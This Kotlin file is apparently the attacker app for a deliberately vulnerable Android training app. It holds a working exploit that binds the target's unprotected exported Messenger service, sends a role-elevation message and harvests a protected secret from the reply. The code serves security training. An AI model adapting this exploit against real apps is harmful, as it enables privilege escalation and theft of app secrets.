package com.dvma.attacker

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.util.Log

/**
 * Binds DVMA's exported privileged Service and invokes it cross-process.
 * FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
 *
 * privileged_service_binding_exposure: DVMA exports a bindable Messenger
 * service with no caller check. This unprivileged app binds it, requests the
 * protected secret, and harvests the reply - a cross-process bind + call.
 */
object ServiceBinderClient {

    private const val TAG = "DVMA-ATTACKER"
    private const val MSG_READ_SECRET = 1
    private const val MSG_ELEVATE_ROLE = 2

    fun bindAndHarvest(ctx: Context) {
        val replyHandler = object : Handler(Looper.getMainLooper()) {
            override fun handleMessage(msg: Message) {
                if (msg.what == MSG_READ_SECRET) {
                    val secret = msg.data?.getString("secret")
                    val line = "HARVESTED service secret: $secret"
                    Log.w(TAG, line)
                    AttackerCapture.record(line)
                }
            }
        }
        val replyMessenger = Messenger(replyHandler)

        val conn = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, binder: IBinder?) {
                val service = Messenger(binder)
                Log.w(TAG, "bound ${Dvma.PRIVILEGED_SERVICE}")
                // Ask the service to elevate our role and read the secret.
                runCatching {
                    service.send(Message.obtain(null, MSG_ELEVATE_ROLE))
                    service.send(Message.obtain(null, MSG_READ_SECRET).apply {
                        replyTo = replyMessenger
                    })
                }
            }

            override fun onServiceDisconnected(name: ComponentName?) {}
        }

        val intent = Intent().apply { setClassName(Dvma.PKG, Dvma.PRIVILEGED_SERVICE) }
        val ok = runCatching { ctx.bindService(intent, conn, Context.BIND_AUTO_CREATE) }
            .getOrDefault(false)
        Log.w(TAG, "bindService ${Dvma.PRIVILEGED_SERVICE} -> $ok")
        // Keep the binding briefly so the reply arrives, then unbind.
        Handler(Looper.getMainLooper()).postDelayed({
            runCatching { ctx.unbindService(conn) }
        }, 2000)
    }
}
